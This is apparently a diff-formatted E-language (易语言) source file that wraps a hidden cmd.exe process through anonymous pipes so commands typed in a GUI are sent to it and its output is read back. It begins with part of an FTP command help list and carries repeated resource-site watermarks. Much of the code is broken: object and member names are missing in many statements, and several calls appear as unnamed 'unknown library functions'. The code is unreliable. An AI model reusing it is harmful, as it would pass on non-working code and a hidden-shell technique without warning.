+59.sendport：设置PORT命令的使用。 
+
+60.site arg1，arg2...：将参数作为SITE命令逐字发送至远程ftp主机。
+
+61.size file-name：显示远程主机文件大小，如：site idle 7200。 
+
+62.status：显示当前ftp状态www.jz5u.com
+63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。 
+
+64.sunique：将远程主机文件名存储设置为只一(与runique对应)。
+
+65.system：显示远程主机的操作系统类型。 
+
+66.tenex：将文件传输类型设置为TENEX机的所需的类型。
+
+67.tick：设置传输时的字节计数器。 
+
+68.trace：设置包跟踪。
+
+69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。 
+
+70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3
+
+71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。 
+
+72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.
+
+73.?[cmd]：同help.
+”", , 
+
+
+ ' 所需要的支持库：
+ ' krnln d09f2340818511d396f6aaf844c7e325 5 0 系统核心支持库
+ ' iext 27bb20fdd3e145e4bee3db39ddd6e64c 2 0 扩展界面支持库一
+ ' spec A512548E76954B6E92C21055517615B0 3 0 特殊功能支持库
+ ' EThread 5F99C1642A2F4e03850721B4F5D7C3F8 2 0 多线程支持库
+
+
+
+
+数据类型 安全属性, , SECURITY_ATTRIBUTES
+    .成员 长度, 整数型, , , 
+    .成员 权限, 整数型, , , 
+    .成员 句柄, 整数型, , , 
+
+数据类型 进程信息, , 
+    .成员 进程号, 整数型, , , 
+    .成员 线程号, 整数型, , , 
+    .成员 进程ID, 整数型, , , 
+    .成员 线程ID, 整数型, , , 
+
+数据类型 启动信息, , 
+    .成员 cb, 整数型, , , 
+    .成员 lpReserved, 整数型, , , 
+    .成员 lpDesktop, 整数型, , , 
+    .成员 lpTitle, 整数型, , , 
+    .成员 dwX, 整数型, , , 
+    .成员 dwY, 整数型, , , 
+    .成员 dwXSize, 整数型, , , 
+    .成员 dwYSize, 整数型, , , 
+    .成员 dwXCountChars, 整数型, , , 
+    .成员 dwYCountChars, 整数型, , , 
+    .成员 dwFillAttribute, 整数型, , , 
+    .成员 dwFlags, 整数型, , , 
+    .成员 wShowWindow, 短整数型, , , 
+    .成员 cbReserved2, 短整数型, , , 
+    .成员 lpReserved2, 整数型, , , 
+    .成员 hStdInput, 整数型, , , 
+    .成员 hStdOutput, 整数型, , , 
+    .成员 hStdError, 整数型, , , 
+
+
+.DLL命令 创建匿名管道, 整数型, "", "CreatePipe", , 
+    .参数 输出管道, 整数型, 传址, 
+    .参数 输入管道, 整数型, 传址, 
+    .参数 管道属性, 安全属性, 传址, 
+    .参数 尺寸, 整数型, , 
+
+.DLL命令 创建进程, 整数型, "", "CreateProcessA", , 
+    .参数 程序名称, 整数型, , 32位程序用，可设为文本型
+    .参数 命令行, 文本型, , 
+    .参数 进程属性, 整数型, , 
+    .参数 线程属性, 整数型, , 
+    .参数 参数一, 整数型, , 
+    .参数 参数二, 整数型, , 
+    .参数 参数三, 整数型, , 
+    .参数 运行目录, 文本型, , 如需指定运行目录设为文本行
+    .参数 启动信息, 启动信息, , 
+    .参数 进程信息, 进程信息, , 
+
+.DLL命令 读文件, 整数型, "", "ReadFile", , 
+    .参数 文件号, 整数型, , 
+    .参数 缓存, 字节集, 传址, 
+    .参数 读取尺寸, 整数型, , 
+    .参数 实际尺寸, 整数型, 传址, 
+    .参数 参数, 整数型, , 
+
+.DLL命令 写文件, 整数型, "", "WriteFile", , 
+    .参数 文件号, 整数型, , 
+    .参数 写入内容, 字节集, 传址, 
+    .参数 写入尺寸, 整数型, , 
+    .参数 实际尺寸, 整数型, 传址, 
+    .参数 参数, 整数型, , 
+
+.DLL命令 关闭句柄, 整数型, "", "CloseHandle", , 
+    .参数 句柄, 整数型, , 
+
+.DLL命令 获取进程状态, 整数型, "", "GetExitCodeProcess", , 
+    .参数 进程号, 整数型, , 
+    .参数 进程状态, 整数型, 传址, 
+
+.DLL命令 获取启动信息_, 整数型, "kernel32", "GetStartupInfoA", , 
+    .参数 启动信息, 启动信息, 传址, 
+
+.DLL命令 结束进程, 逻辑型, "", "TerminateProcess", , 
+    .参数 指定进程, 整数型, , 
+    .参数 退出标记, 整数型, , 
+
+.DLL命令 打开进程句柄, 整数型, "", "OpenProcess", , 
+    .参数 访问方法, 整数型, , 
+    .参数 子程序继承, 逻辑型, , 是否由子程序继承
+    .参数 进程标识符, 整数型, , 
+
+.DLL命令 取系统目录_, 整数型, "kernel32", "GetSystemDirectoryA", , 
+    .参数 缓冲区, 文本型, , 
+    .参数 缓冲区长度, 整数型, , 
+
+.窗口程序集 窗口程序集1, , , 
+
+.程序集变量 CMD进程的进程ID, 整数型, , , 
+.程序集变量 输入命令的实际长度, 整数型, , , 
+.程序集变量 命令名, 文本型, , , 
+.程序集变量 要输出到的编辑框, 编辑框, , , 
+.子程序 __启动窗口_创建完毕, 空白型, , 
+ ' --========  易语言资源网  (www.5A5X.com)  ======--
+ ' 努力创建完善、持续更新的易语言学习例程源码资源站
+ ' --================   www.5A5X.com  ===========--
+ ' --==================   易语言资源网注意事项  ================--
+ ' * 易语言资源网为易语言官方站、易语言官方论坛提供辅助资源站；
+ ' 本易语言资源网( www.5A5X.com)所有软件和资料均为软件作者提
+ ' 供和网友推荐发布而来，其版权归该软件和程序源码的合法拥有者所
+ ' 有，本站易语言资源网整理收集仅供易语言用户学习和易语言技术研
+ ' 究探讨使用，不得用于任何商业用途。如果由于以上原因造成的版权
+ ' 纠纷本站概不负责！
+ ' * 本站资源未经许可，任何网站不得非法盗链及抄袭本站资源；如引用
+ ' 页面，请注明来自易语言资源网，谢谢合作！
+ ' --=====================   www.5A5X.com  ================--
+
+赋值 (要输出到的编辑框, )
+_按钮1_被单击 ()
+_按钮3_被单击 ()
+载入常用命令 ()
+赋值 (.内容, #常_帮助1)
+
+获取焦点 ()
+
+.子程序 _按钮1_被单击, 空白型, , 
+赋值 (CMD进程的进程ID, 控制台_连接 ())
+.如果真 (等于 (CMD进程的进程ID, 0))
+    相加 (“连接到创建的一个隐式CMD进程失败了！！！”, #换行符).加入文本 ()
+    
+.如果真结束
+相加 (“连接到创建的一个隐式CMD进程成功了！！！”, #换行符).加入文本 ()
+ ' 本源码来自易语言资源网(www.5A5X.com)
+
+.子程序 _按钮2_被单击, 空白型, , 
+赋值 (命令名, .内容)
+赋值 (输入命令的实际长度, 控制台_发送命令 (命令名))
+.如果真 (等于 (输入命令的实际长度, 0))
+    相加 (“控制台_发送[”, 命令名, “]命令失败”, #换行符).加入文本 ()
+    返回 ()
+.如果真结束
+
+相加 (“控制台_发送[”, 命令名, “]命令成功,命令长度：”, 到文本 (输入命令的实际长度), #换行符).加入文本 ()
+
+
+.子程序 _按钮3_被单击, 空白型, , 
+
+.如果真 (等于 (控制台_取回结果 (要输出到的编辑框), 假))
+    相加 (“控制台_取回结果失败”, #换行符).加入文本 ()
+    返回 ()
+.如果真结束
+相加 (“控制台_取回结果成功”, #换行符).加入文本 ()
+
+
+.子程序 _按钮4_被单击, 空白型, , 
+.如果真 (控制台_断开连接 ())
+    相加 (“控制台_断开连接成功”, #换行符).加入文本 ()
+    返回 ()
+.如果真结束
+相加 (“控制台_断开连接失败”, #换行符).加入文本 ()
+
+.子程序 __启动窗口_可否被关闭, 逻辑型, , 
+控制台_断开连接 ()
+
+.子程序 _编辑框_输入_按下某键, 逻辑型, , 
+.参数 键代码, 整数型, , 
+.参数 功能键状态, 整数型, , 
+
+.如果真 (等于 (键代码, #回车键))
+    _按钮2_被单击 ()
+    .如果真 (等于 (到大写 (删全部空 (.内容)), “CLS”))
+        赋值 (.内容, “”)
+    .如果真结束
+    赋值 (.现行子夹, 0)
+    赋值 (.内容, “”)
+    获取焦点 ()
+.如果真结束
+ ' 本源码来自易语言资源网(www.5A5X.com)
+
+.子程序 __启动窗口_尺寸被改变, 空白型, , 
+.移动 (相减 (_启动窗口., 20), 相减 (_启动窗口., 80))
+.移动 (相减 (.宽度, 16), 相减 (.高度, 35))
+赋值 (.宽度, 相减 (.宽度, 82))
+.移动 (相减 (.宽度, 16), 相减 (.高度, 35))
+.移动 (相减 (.宽度, 16), 相减 (.高度, 35))
+.移动 (相减 (.宽度, 16), 相减 (.高度, 35))
+
+.子程序 _选择夹_下方_被单击, 空白型, , 
+获取焦点 ()
+
+
+.子程序 载入常用命令, 空白型, , 
+.局部变量 文本数组, 文本型, , "0", 
+.局部变量 数组大小, 整数型, , , 
+.局部变量 计次, 整数型, , , 
+.局部变量 表项数, 整数型, , , 
+.局部变量 表位置, 整数型, , , 
+.局部变量 说明文本, 文本型, , , 
+
+赋值 (文本数组, 分割文本 (#常_命令, #换行符, ))
+赋值 (数组大小, 取数组成员数 (文本数组))
+.如果真 (小于或等于 (取数组成员数 (文本数组), 0))
+    返回 ()
+.如果真结束
+
+.计次循环首 (数组大小, 计次)
+     ' 选择列表框1.加入项目 (文本数组 [计次], )
+    .如果真 (等于 (删全部空 (文本数组 [计次]), “”))
+        调试输出 (取文本长度 (文本数组 [计次]))
+        到循环尾 ()
+    .如果真结束
+    赋值 (表项数, -1.插入表项 ())
+    表项数.置标题 (0, 取文本左边 (文本数组 [计次], 5))
+    赋值 (表位置, 寻找文本 (文本数组 [计次], “&&”, , 假))
+    表项数.置标题 (1, 取文本中间 (文本数组 [计次], 6, 相减 (表位置, 6)))
+     ' 超级列表框1.置标题 (表项数, 2, 文本数组 [计次])
+    赋值 (说明文本, 取文本中间 (文本数组 [计次], 相加 (表位置, 2), 相减 (取文本长度 (文本数组 [计次]), 表位置)))
+    赋值 (说明文本, 子文本替换 (说明文本, “REM”, “”, , , 假))
+    赋值 (说明文本, 子文本替换 (说明文本, “-”, “”, , , 假))
+    赋值 (说明文本, 删首空 (说明文本))
+    表项数.置标题 (2, 说明文本)
+.计次循环尾 ()
+
+
+.子程序 _超级列表框1_被双击, 逻辑型, , 
+.参数 横向位置, 整数型, , 
+.参数 纵向位置, 整数型, , 
+.参数 功能键状态, 整数型, , 
+
+赋值 (.内容, 删尾空 (.取标题 (., 1)))
+获取焦点 ()
+ ' 本源码来自易语言资源网(www.5A5X.com)
+
+
+.子程序 _单选框1_被单击, 空白型, , 
+赋值 (.内容, #常_帮助1)
+
+
+.子程序 _单选框2_被单击, 空白型, , 
+赋值 (.内容, #常_帮助2)
+
+
+.子程序 _单选框3_被单击, 空白型, , 
+赋值 (.内容, #常_帮助3)
+' 本源码来自易语言资源网(www.5A5X.com)
+
+.子程序 _单选框4_被单击, 空白型, , 
+赋值 (.内容, #常_帮助4)
+
+
+.程序集 程序集_管道, , , 
+
+.程序集变量 加入文本, 文本型, , , 
+.程序集变量 连接, 逻辑型, , , 
+.程序集变量 iption, 文本型, , , 
+.程序集变量 进程信息, 进程信息, , , 
+.程序集变量 管道b, 整数型, , , 
+.程序集变量 管道a, 整数型, , , 
+.程序集变量 安全属性b, 安全属性, , , SECURITY_ATTRIBUTES
+.程序集变量 安全属性a, 安全属性, , , 
+.程序集变量 启动信息, 启动信息, , , 
+.程序集变量 编辑框, 编辑框, , , 
+.程序集变量 a输出管道, 整数型, , , 
+.程序集变量 a输入管道, 整数型, , , 
+.程序集变量 b输出管道, 整数型, , , 
+.程序集变量 b输入管道, 整数型, , , 
+.程序集变量 进入许可证, 整数型, , , 
+.子程序 _启动子程序, 整数型, , 请在本子程序中放置易模块初始化代码
+赋值 (连接, 假)
+_临时子程序 () ' 在初始化代码执行完毕后调用测试代码
+返回 (0) ' 可以根据您的需要返回任意数值
+
+.子程序 _临时子程序, 空白型, , 
+ ' 本名称子程序用作测试程序用，仅在开发及调试环境中有效，编译发布程序前将被系统自动清空，请将所有用作测试的临时代码放在本子程序中。 ***注意不要修改本子程序的名称、参数及返回值类型。
+
+.子程序 控制台_连接, 整数型, 公开, 连接到创建的一个隐式CMD进程,以实现对控制台的标准输入与输出操作.返回CMD进程的进程ID,0意味着失败,非0表示成功.
+.参数 CMD名称, 文本型, 可空, 默认名称是CMD.EXE,如果被改名,请在这里改为相应名称,备注:要创建一个CMD进程,程序必须要知道它的名称.
+.参数 运行目录, 文本型, 可空, 创建CMD进程时的默认目录,这里默认在系统目录,如果要指定其它目录,请在目录名后加上"\"
+
+.局部变量 shell, 文本型, , , 
+.局部变量 系统目录, 文本型, , , 
+.局部变量 创建进程, 整数型, , , 
+.局部变量 实际尺寸, 整数型, , , 
+.局部变量 CMD, 文本型, , , 
+
+.如果真 (不等于 (取操作系统类别 (), 3))
+    输出调试文本 (“Error:控制台连接失败,原因:只对NT以上系统有效!”)
+    返回 (0)
+.如果真结束
+ ' 是否已经断开连接
+.如果真 (连接)
+    输出调试文本 (“Error:控制台已经连接,请不要重复连接!”)
+    返回 (进程信息.)
+.如果真结束
+ ' 匿名管道A,用来写
+赋值 (安全属性a., 12)
+赋值 (安全属性a., 0)
+赋值 (安全属性a., -1)
+赋值 (管道a, 创建匿名管道 (a输出管道, a输入管道, 安全属性a, 0))
+.如果真 (等于 (管道a, 0))
+    输出调试文本 (“Error:创建匿名管道失败,原因:创建匿名管道失败!”)
+    返回 (0)
+.如果真结束
+ ' 匿名管道B,用来读
+赋值 (安全属性b., 12)
+赋值 (安全属性b.权限, 0)
+ ' 本源码来自易语言资源网(www.5A5X.com)
+赋值 (安全属性b., -1)
+赋值 (管道b, 创建匿名管道 (b输出管道, b输入管道, 安全属性b, 0))
+ ' 创建CMD进程,重定向输入和输出到匿名管道
+获取启动信息_ (启动信息) ' 用本进程启动信息填充CMD启动信息其它项
+赋值 (启动信息., 257) ' 大小类型
+赋值 (启动信息., a输出管道) ' 重定向标准输入
+赋值 (启动信息., b输入管道) ' 重定向标准输出
+赋值 (启动信息., b输入管道) ' 重定向标准错误输出
+赋值 (启动信息., 0) ' 隐藏运行
+赋值 (系统目录, 相加 (取系统目录 (), “\”))
+.如果真 (是否为空 (CMD名称))
+    赋值 (CMD名称, “cmd.exe”)
+.如果真结束
+.如果 (等于 (是否为空 (运行目录), 真))
+    赋值 (创建进程, 创建进程 (0, CMD名称, 0, 0, -1, 0, 0, 系统目录, 启动信息, 进程信息))
+.否则
+    赋值 (创建进程, 创建进程 (0, CMD名称, 0, 0, -1, 0, 0, 运行目录, 启动信息, 进程信息))
+.如果结束
+.如果真 (等于 (创建进程, 0))
+    输出调试文本 (“Error:控制台连接失败,原因:创建CMD进程失败!”)
+    返回 (0)
+.如果真结束
+赋值 (连接, 真) ' 做个标记先
+赋值 (进入许可证, 未知支持库函数_1 ())
+字符 (0)
+返回 (进程信息.)
+
+.子程序 控制台_发送命令, 整数型, 公开, 向已经连接的控制台发送命令(标准输入),返回输入命令的实际长度,返回0意味着失败,非0表示成功.
+.参数 命令名, 文本型, , 可以是任何控制台命令,注意:已经对exit命令做了处理,输入命令"exit"可以达到断开连接的目地.
+
+.局部变量 实际尺寸, 整数型, , , 
+.局部变量 shell, 字节集, , , 
+
+.如果真 (等于 (连接, 真))
+    赋值 (命令名, 删首尾空 (命令名))
+    .如果真 (不等于 (命令名, “”))
+        .如果真 (等于 (文本比较 (命令名, “exit”, 假), 0)) ' 判断是否是退出命令
+            控制台_断开连接 ()
+            返回 (4)
+        .如果真结束
+        .如果真 (等于 (文本比较 (命令名, “cls”, 假), 0)) ' 清屏命令
+            赋值 (shell, 到字节集 (相加 (取系统目录 (), “>”)))
+            写文件 (b输入管道, shell, 取字节集长度 (shell), 实际尺寸, 0)
+            返回 (3)
+        .如果真结束
+         ' 本源码来自易语言资源网(www.5A5X.com)
+    .如果真结束
+     ' 很关键的一步,写入的命令最后一定要加上换行符,不然CMD是不会理你的,我可是试了好久才明白的,555,好辛苦
+    赋值 (shell, 到字节集 (相加 (命令名, #换行符)))
+    写文件 (a输入管道, shell, 取字节集长度 (shell), 实际尺寸, 0)
+.如果真结束
+返回 (实际尺寸)
+
+.子程序 控制台_取回结果, 逻辑型, , 取回已连接控制台的命令提示(控制台标准输出与标准错误输出,也就是"回显"),成功返回真,失败返回假..
+.参数 输出编辑框, 编辑框, , 要输出到的编辑框.
+
+赋值 (编辑框, 输出编辑框)
+.如果真 (连接)
+    返回 (未知支持库函数_0 (&读管道, ))
+.如果真结束
+返回 (假)
+
+.子程序 控制台_断开连接, 逻辑型, , 断开一个已经连接的控制台,成功返回真,失败返回假.注意:在标准输入里输入命令"exit"也可以达到断开连接的目地.
+.如果真 (连接)
+    未知支持库函数_2 (进入许可证)
+    关闭句柄_ ()
+    .如果真 (结束进程 (打开进程句柄 (1, 假, 进程信息.), 3389))
+        赋值 (连接, 假)
+        返回 (真)
+    .如果真结束
+    
+.如果真结束
+返回 (假)
+
+.子程序 关闭句柄_, 空白型, , 
+关闭句柄 (a输出管道)
+关闭句柄 (b输出管道)
+关闭句柄 (a输入管道)
+关闭句柄 (b输入管道)
+
+
+.子程序 读管道, 空白型, , 
+.局部变量 实际尺寸, 整数型, , , 
+.局部变量 缓存, 字节集, , , 
+
+未知支持库函数_3 (进入许可证)
+赋值 (编辑框.内容, “”)
+赋值 (缓存, 取空白字节集 (260))
+.判断循环首 (并且 (不等于 (读文件 (b输出管道, 缓存, 260, 实际尺寸, 0), 0), 不等于 (实际尺寸, 0)))
+    赋值 (加入文本, 到文本 (取字节集左边 (缓存, 实际尺寸)))
+    .如果真 (大于 (相加 (取文本长度 (编辑框.内容), 取文本长度 (加入文本)), 30000)) ' 编辑框最大只能写入30000个字
+        赋值 (编辑框.内容, “”)
+    .如果真结束
+    编辑框.加入文本 (加入文本)
+    ' 本源码来自易语言资源网(www.5A5X.com)
+.判断循环尾 ()
+未知支持库函数_4 (进入许可证)
+
+.子程序 取系统目录, 文本型, , 
+.局部变量 缓冲区, 文本型, , , 
+.局部变量 长度, 整数型, , , 
+
+赋值 (缓冲区, 取空白文本 (260))
+赋值 (长度, 取系统目录_ (缓冲区, 260))
+返回 (删首尾空 (缓冲区))
+
+
+ ' 不属于任何一个程序集、类模块的函数：
